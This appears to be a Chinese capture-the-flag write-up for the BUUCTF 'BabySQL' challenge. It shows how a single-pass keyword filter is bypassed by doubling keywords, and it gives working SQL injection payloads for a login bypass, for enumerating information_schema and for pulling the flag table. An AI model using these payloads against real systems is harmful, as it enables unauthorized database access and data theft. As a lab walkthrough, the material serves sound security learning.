# T8 BabySQL

> 题目：BUUCTF [极客大挑战 2019]BabySQL

__0x00 审题__

> 之前说遇到了连续剧，没想到昨天那个后面还有续集，一块做了吧

他上面说已经做了严格的审查，我们再也登不进去了，弱密码不行，直接万能密码，发现报错

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1=1#'' at line 1
```

* 注意这里明明我用的是' or 1=1#，但是or不见了，考虑被过滤掉了

__0x01 解题__

1. 小tip:双写or,可以试试他是不是只过滤一次

```
?username=admin&password=' oorr 1=1#
```

过了开心：

```
Hello admin！
Your password is 'b805254663161a50d4ec808478ab5d6b'
```

2. 直接猜测和上题一致

检查用户名处有无注点：“?username=1' order by 1%23&password=123”————发现奇怪的变成了“der 1#' and password='123''”不会都过滤了吧

```
?username=11' oorrder bbyy 4%23&password=123 
```

回显:

```
Unknown column '4' in 'order clause'
```

> 终于差不多了，感觉之后就和上一题一模一样了

> 下面回顾

3. 判断字段

直接输入，果然删的啥都不剩了：'1,2,3#' and password='123''

```
?username=admin&password=123' ununionion seselectlect 1,2,3%23
```

简单粗暴得解:
```
Hello 2！
Your password is '3'
```

4. 2,3有回显，查表

直接写很显然不对，观察什么被再次过滤，发现是from information_schema，双写过滤

```
' ununionion selselectect 1,2,group_concat(schema_name)  frfromom  (infoorrmation_schema.schemata) %23
```

回显:

```
Hello 2！
Your password is 'information_schema,mysql,performance_schema,test,ctf,geek'
```

打眼ctf，直接查字段

5. ctf中字段

where被过滤直接双写得：

```
' ununionion selselectect 1,2,group_concat(table_name)  frfromom  (infoorrmation_schema.tables) whwhereere table_schema='ctf' %23
```

re:

```
Hello 2！
Your password is 'Flag'
```

_字段里有好东西_

6. 查里面内容

and又被绕过了，这绕过的也太多了吧

```
' ununionion selselectect 1,2,group_concat(column_name)  frfromom  (infoorrmation_schema.columns) whwhereere table_schema='ctf' aandnd table_name='Flag' %23
```

回显:

```
Hello 2！
Your password is 'flag'
```

> 为啥还不行，好慢（

7. 找数据

```
' ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23
```
得到flag

__0x02 总结__

1. 避免被过滤的方法，可以双写，只过滤一次
2. 再次熟悉注入过程
